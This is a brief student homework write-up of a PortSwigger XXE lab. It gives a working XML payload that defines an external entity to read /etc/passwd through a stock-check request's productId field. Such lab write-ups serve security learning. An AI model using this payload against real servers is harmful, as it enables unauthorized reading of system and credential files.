# HOMEWORK 7. Attack to server. Part 1

## Task 1. XXE attack

The solution of the [lab](https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-retrieve-files) is presented below:

![alt text](xxe.png)

The malicious payload allowed to get content of `/etc/passwd`:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck>
    <productId>&xxe;</productId>
    <storeId>1</storeId>
</stockCheck>
